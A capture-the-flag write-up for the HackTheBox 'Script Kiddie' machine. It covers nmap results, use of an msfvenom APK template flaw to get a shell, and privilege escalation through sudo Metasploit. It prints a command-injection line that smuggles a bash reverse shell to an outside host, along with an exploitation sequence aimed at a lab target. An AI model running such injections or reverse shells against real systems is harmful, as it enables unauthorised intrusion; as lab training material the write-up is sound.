# HackTheBox-Script Kiddie

## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-02 19:59 PKT
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.63% done; ETC: 19:59 (0:00:00 remaining)
Nmap scan report for 10.10.10.226
Host is up (0.21s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
4444/tcp open  krb524?
| fingerprint-strings:
|   GetRequest, NULL:
|     eNrsvWmXIjmSKPo9fwVddXsCiqhgc3AnTmXNEOz7vmbncHwDHHwB31i66/32J/kq34DIqntn7pmbfboCl0wmk8lkMkkm089/S2mKnKI4MXW8qjtJ/MIJR0lWYyCFVGiOs79piWHt35Ji/z
rypLqRZMH+lkmRkdwvp4TC8iytOl8SfWDdL1XWkDyNOsoSzSpOHcrV+anuZJZkOHHrJ
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.45 seconds

```

## PORT 5000 (HTTP)

<img src="https://imgur.com/NLLAJJ1.png"/>

Here we can do an nmap scan on the machine but if we try to run bash commands it won't work

<img src="https://imgur.com/QXOmFOU.png"/>

<img src="https://imgur.com/n5mThGc.png"/>

Similarly with the msfvenom and searchsploit

<img src="https://imgur.com/BzJTgtb.png"/>

Msfvenom successfully generetes payload

<img src="https://imgur.com/WsEp93j.png"/>

But only windows and android payload generates

<img src="https://imgur.com/gdGJrIu.png"/>


Also there weren't any hidden directories or files on the webserver this page was only there on the machine. So on googling a little bit I found that `msfvenom` recently had a vulnerability in the process generating payload

<img src="https://imgur.com/JtdAtf1.png"/>

<img src="https://imgur.com/7PyVLu3.png"/>

This was a latest exploit so metasploit needs to be update if you run to any issues when updating metasploit regarding the gem file do this inorder

`gem update`
`cd /usr/share/metasploit-framework`
`sudo nano Gemfile.lock` (update reline version in that file this important before bundle install)  
`sudo bundle install` ( in metasploit folder)

<img src="https://imgur.com/8Q46lfu.png"/>

<img src="https://imgur.com/0LR7Eg9.png"/>

<img src="https://imgur.com/B2pigeV.png"/>

Upload the apk file on the website

<img src="https://imgur.com/HCj6XEo.png"/>

<img src="https://imgur.com/DD2Z1sO.png"/>

And you'll get a shell so we will need to stabilize it 

<img src="https://imgur.com/1MOGsiD.png"/>

Going to `pwn`'s home directory we see a bash script `scanlosers.sh` which was reading  a script file from `kid`'s home directory and execute it 

<img src="https://imgur.com/4vBH6TR.png"/>

Seeing that file belongs to `pwn`'s group

<img src="https://imgur.com/sOM8Kfa.png"/>

We can edit this with a bash reverse shell , this is the way the payload needs to be crafted.

`echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.126/1337 0>&1'  #" >> hackers`

<img src="https://imgur.com/DcTRUUb.png"/>

Doing `sudo -l` 

<img src="https://imgur.com/lwZ1jUB.png"/>

Running metasploit as `sudo`

<img src="https://imgur.com/CVSx2Ia.png"/>

We can now run commands as `root`

<img src="https://imgur.com/ZE6bFiQ.png"/>

<img src="https://imgur.com/r0Xsgrw.png"/>
